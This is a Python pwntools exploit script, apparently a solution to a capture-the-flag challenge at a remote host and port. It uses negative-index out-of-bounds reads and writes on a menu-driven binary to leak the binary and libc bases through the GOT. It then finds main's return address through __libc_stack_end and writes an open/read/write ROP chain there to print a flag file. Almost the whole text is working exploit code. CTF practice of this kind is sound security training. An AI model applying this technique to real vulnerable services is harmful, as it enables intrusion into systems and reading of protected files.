#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('./thing')



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return remote('io.ept.gg', 30002)
        #return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *view
continue
'''.format(**locals())

# -- Exploit goes here --

def packit(index):
    x = struct.pack('>i', index)
    context.endian = 'big'
    x = u32(x)
    context.endian='little'
    return x
    
def create(idx):
    idx = packit(idx)
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(idx).encode())

def edit(idx, data):

    idx = packit(idx)
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b':', str(idx).encode())
    if len(data) == 0x10:
        io.sendafter(b':', data)
    else:
        io.sendlineafter(b':', data)

def delete(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b':', str(idx).encode())

def view(idx):
    idx = packit(idx)
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b': ', str(idx).encode())
    return io.recvline().strip()

def exit(idx):
    io.sendlineafter(b'>', b'5')

def getMinusAddr(addr):
    minus = 0
    listAdr = exe.sym.listOfThings
    if addr > listAdr+7*8:
        minus = listAdr // 8
        minus += (0x10000000000000000 - addr) // 8
    return -minus
    print(hex(exe.sym.listOfThings))

libc = ELF('./libc-2.35.so')

io = start()
leak = view(-11)
leak = u64(leak.ljust(8, b'\x00'))
exe.address =  leak- 0x4008
edit(-11, p64(exe.address + 0x4010))
edit(-11, p64(exe.got.puts))
leak = view(-10)
leak = u64(leak.ljust(8, b'\x00'))
libc.address = leak - libc.sym.puts
log.success(f'libc base @ {hex(libc.address)}')


edit(-11, p64(libc.sym.__libc_stack_end))
leak = view(-10)
ldStack = u64(leak.ljust(8, b'\x00'))
edit(-11, p64(ldStack))
leak = view(-10)
ldStack = u64(leak.ljust(8, b'\x00'))
libc_ret_main = ldStack - 0x108
print(f'libc_main_ret on stack @ {hex(libc_ret_main)}')
edit(-11, p64(exe.address + 0x4400))
edit(-10, b'/opt/flag\x00')
rop2 = ROP(libc)
rop2.call(rop2.ret.address)
rop2.open(exe.address + 0x4400, 0,0,0)
rop2.read(3, exe.address + 0x4500, 0x50)
rop2.write(1,  exe.address + 0x4500, 0x50)
ropchain = rop2.chain()

gadgets = [ropchain[i:i+8] for i in range(0, len(ropchain), 8)]

for i in range(0, len(gadgets), 1):
    edit(-11, p64(libc_ret_main+(i*8)))
    edit(-10, gadgets[i] )

    
io.interactive()

